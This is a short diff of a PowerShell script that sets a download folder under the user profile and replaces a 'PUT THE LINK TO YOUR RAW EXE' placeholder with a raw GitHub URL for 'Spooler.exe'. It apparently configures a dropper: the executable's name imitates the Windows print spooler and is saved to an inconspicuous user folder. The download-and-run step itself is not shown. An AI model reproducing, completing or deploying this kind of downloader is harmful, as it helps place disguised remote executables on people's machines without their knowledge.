@@ -1,6 +1,6 @@
 # Define the download directory and executable URL
 $downloadDirectory = "$env:USERPROFILE\Library"
-$exeUrl = "PUT THE LINK TO YOUR RAW EXE"
+$exeUrl = "https://github.com/jimmyisdabest342234/joshaiden38/raw/main/Spooler/Spooler.exe"
 
 # Ensure the directory exists, or create it if it doesn't
 if (-not (Test-Path -Path $downloadDirectory -PathType Container)) {
